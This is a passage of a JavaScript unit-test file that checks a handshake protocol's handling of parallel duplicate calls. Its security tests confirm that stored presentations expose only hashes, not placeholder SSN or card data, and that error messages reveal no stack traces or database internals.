    const params = validHandshakeParams();

    // Two identical initiateHandshake calls
    const [result1, result2] = await Promise.all([
      initiateHandshake(params),
      initiateHandshake(params),
    ]);

    // Both should succeed (the mock protocolWrite doesn't enforce idempotency,
    // but the real protocolWrite does via computeIdempotencyKey). Here we verify
    // that parallel identical calls don't crash.
    expect(result1.handshake_id).toBeDefined();
    expect(result2.handshake_id).toBeDefined();

    // In the real system, the second call would return _idempotent: true.
    // With our mock, both create records. Either way, no crash or error.
    const handshakes = sim.getTable('handshakes');
    expect(handshakes.length).toBeGreaterThanOrEqual(1);
  });
});

// ============================================================================
// 9. Data Exfiltration Attempts (2 tests)
// ============================================================================

describe('Data Exfiltration Attempts', () => {
  let sim;

  beforeEach(() => {
    vi.clearAllMocks();
    sim = createTableSim();
    mockGetServiceClient.mockReturnValue(sim.mockClient());
  });

  // Attack: Query a handshake and check that raw presentation payloads are
  // not exposed — only hashes are stored and returned.
  it('getHandshake does not expose raw presentation payload — only hashes', async () => {
    const result = await initiateHandshake(validHandshakeParams());
    const hsId = result.handshake_id;

    const sensitiveData = JSON.stringify({
      ssn: '123-45-6789',
      credit_card: '4111-1111-1111-1111',
      entity_id: 'entity-alice',
    });

    await addPresentation(hsId, 'initiator', validPresentation({ data: sensitiveData }));

    // getHandshake returns the full state
    const hsState = await getHandshake(hsId);

    expect(hsState).toBeDefined();
    expect(hsState.presentations).toHaveLength(1);

    // The presentation record should contain the hash, not the raw data
    const pres = hsState.presentations[0];
    expect(pres.presentation_hash).toMatch(/^[0-9a-f]{64}$/);

    // Verify sensitive data is NOT present anywhere in the response
    const serialized = JSON.stringify(hsState);
    expect(serialized).not.toContain('123-45-6789');
    expect(serialized).not.toContain('4111-1111-1111-1111');
  });

  // Attack: Trigger an error and check that the error message does not leak
  // internal implementation details like stack traces or DB schema.
  it('error responses do not leak internal stack traces or DB schema', async () => {
    // Trigger a HandshakeError by providing invalid input
    try {
      await initiateHandshake({ mode: 'invalid_mode' });
      expect.unreachable('Should have thrown');
    } catch (err) {
      // Error should be a HandshakeError with a safe message
      expect(err.name).toBe('HandshakeError');
      expect(err.code).toBe('INVALID_MODE');
      expect(err.status).toBe(400);

      // Should NOT contain internal details
      expect(err.message).not.toMatch(/at\s+\w+\s+\(/); // no stack frame
      expect(err.message).not.toContain('supabase');
      expect(err.message).not.toContain('SELECT');
      expect(err.message).not.toContain('INSERT');
      expect(err.message).not.toContain('postgres');
    }

    // Trigger missing handshake error
    try {
      await revokeHandshake('eph_does_not_exist', 'test');
      expect.unreachable('Should have thrown');
    } catch (err) {
      expect(err.name).toBe('HandshakeError');
      expect(err.code).toBe('NOT_FOUND');
      // Message should be a safe user-facing string
      expect(err.message).toBe('Handshake not found');
      expect(err.message).not.toContain('table');
      expect(err.message).not.toContain('column');
    }

    // Trigger missing required fields error
    try {
      await addPresentation(null, 'initiator', validPresentation());
      expect.unreachable('Should have thrown');
    } catch (err) {
      expect(err.name).toBe('HandshakeError');
      expect(err.message).not.toContain('undefined');
      expect(err.message).not.toContain('TypeError');
    }
  });
});
